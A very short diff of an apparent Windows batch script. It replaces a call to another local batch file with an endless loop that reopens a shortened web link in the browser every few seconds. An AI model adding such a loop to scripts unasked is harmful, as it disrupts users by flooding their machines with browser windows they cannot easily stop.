@@ -1,2 +1,4 @@
+:start
 explorer http://b23.tv/iiRlLPF
-D:\ying\1.bat
+ping -n 5 127.0.0.1>nul
+goto start
